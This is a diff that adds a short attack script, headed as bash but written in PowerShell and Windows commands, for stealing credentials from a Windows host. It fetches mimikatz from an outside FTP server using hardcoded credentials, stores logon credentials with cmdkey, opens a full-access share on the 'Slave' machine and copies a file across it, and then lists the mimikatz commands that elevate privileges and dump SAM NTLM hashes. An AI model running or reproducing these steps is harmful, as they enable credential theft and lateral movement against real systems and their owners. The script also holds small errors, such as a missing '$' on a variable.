@@ -1,0 +1,46 @@
+#!/usr/bin/env bash
+
+#### Variables
+
+ipAddr="192.168.252.105"
+NetBIOSName="WIN-3CANRSUOI64"
+
+## Powershell
+
+### Download mimikatz
+$ftp_uri = 'ftp://mssqlsr:Admin01234@files.netip4.ru/Progs/mimikatz/x64win11/'
+$FileName = 'mimikatz.exe'
+$LocalPath = 'C:\Users\MSSQLSR\Downloads\'
+$user = 'mssqlsr'
+$pass = 'Admin01234'
+
+$download_url = $ftp_uri + $FileName
+$local_path = $LocalPath + FileName
+
+$WebClient = New-Object System.Net.WebClient 
+$WebClient.Credentials = New-Object System.Net.NetworkCredential($user, $pass)
+$WebClient.DownloadFile($download_url, $local_path)
+
+### Add CmdKey Environment
+
+#### Atacker
+cmdkey.exe /ADD:192.168.252.105 /USER:WIN-3CANRSUOI64\MSSQLSR /PASS:Admin01234
+
+#### Slave
+net share Users=c:\Users /GRANT:MSSQLSR,FULL /REMARK:"Users Share"
+
+#### Atacker
+net view 192.168.252.105
+net use z: \\192.168.252.105\Users
+copy $env:UserProfile\mimikatz_download_win11.ps1 z:\MSSQLSR\Downloads\
+net use z: /Delete
+
+### Mimikatz command for dumping SAM with NTLM hashes
+#
+privilege::debug
+token::whoami
+token::elevate
+log sam.log
+lsadump::sam
+log /stop
+exit
